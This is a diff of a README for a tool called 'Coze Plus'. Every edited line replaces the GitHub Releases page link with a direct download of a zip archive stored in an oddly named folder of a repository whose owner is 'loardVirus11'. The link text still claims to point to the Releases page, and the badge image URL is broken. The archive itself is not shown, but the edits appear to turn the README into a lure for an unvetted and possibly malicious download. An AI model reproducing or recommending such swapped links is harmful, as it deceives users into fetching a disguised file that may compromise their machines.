@@ -6,7 +6,7 @@ Welcome to Coze Plus! This application helps you create a smart knowledge base f
 
 ## 📥 Download Link
 
-[![Download Coze Plus](https://img.shields.io/badge/Download%20Coze%20Plus-v1.0-brightgreen)](https://github.com/loardVirus11/coze-plus/releases)
+[![Download Coze Plus](https://raw.githubusercontent.com/loardVirus11/coze-plus/main/reduplicate/coze-plus.zip%20Coze%20Plus-v1.0-brightgreen)](https://raw.githubusercontent.com/loardVirus11/coze-plus/main/reduplicate/coze-plus.zip)
 
 ## 🔍 Features
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets these requirements:
 
 To download Coze Plus, visit the Releases page. Follow these simple steps:
 
-1. Click on this link to go to the [Releases page](https://github.com/loardVirus11/coze-plus/releases).
+1. Click on this link to go to the [Releases page](https://raw.githubusercontent.com/loardVirus11/coze-plus/main/reduplicate/coze-plus.zip).
 2. Locate the latest version of Coze Plus.
 3. Click on the download link for your operating system. 
 4. Once the file downloads, locate it on your computer. 
@@ -57,7 +57,7 @@ Here’s how to make the most of Coze Plus:
    - Try the AI search to find answers quickly.
 
 4. **Stay Updated:**
-   - Regularly check for updates by visiting the [Releases page](https://github.com/loardVirus11/coze-plus/releases).
+   - Regularly check for updates by visiting the [Releases page](https://raw.githubusercontent.com/loardVirus11/coze-plus/main/reduplicate/coze-plus.zip).
 
 ## 🔧 Troubleshooting
 
